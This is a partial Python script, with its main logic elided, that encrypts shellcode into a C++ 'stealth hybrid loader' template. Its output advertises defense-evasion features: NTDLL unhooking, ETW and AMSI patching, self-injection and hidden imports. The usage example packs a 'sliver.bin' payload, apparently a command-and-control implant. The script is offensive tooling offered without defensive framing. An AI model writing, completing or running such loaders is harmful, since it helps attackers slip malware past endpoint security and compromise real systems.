#!/usr/bin/env python3
"""
encrypt_hybrid_stealth.py - Encrypt for stealth hybrid loader
"""
...
def encrypt_shellcode(shellcode_file, output_file):
    ...
    with open('loader_edr_hybrid_stealth.cpp', 'r') as f:
        loader_code = f.read()
    ...
    print(f"[+] ✅ Success!")
    print(f"\n[*] Stealth hybrid loader includes:")
    print(f"    • AES-256-CBC encryption")
    print(f"    • NTDLL unhooking")
    print(f"    • ETW patching")
    print(f"    • AMSI patching")
    print(f"    • Self-injection (proven method)")
    print(f"    • HIDDEN IMPORTS (VirtualAlloc, VirtualProtect, CreateThread)")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: ./encrypt_hybrid_stealth.py <shellcode.bin> <output.cpp>")
        print("\nExample:")
        print("  ./encrypt_hybrid_stealth.py sliver.bin loader_encrypted.cpp")
        sys.exit(1)
    ...
    if not os.path.exists('loader_edr_hybrid_stealth.cpp'):
        print(f"[-] Error: loader_edr_hybrid_stealth.cpp template not found!")
        sys.exit(1)
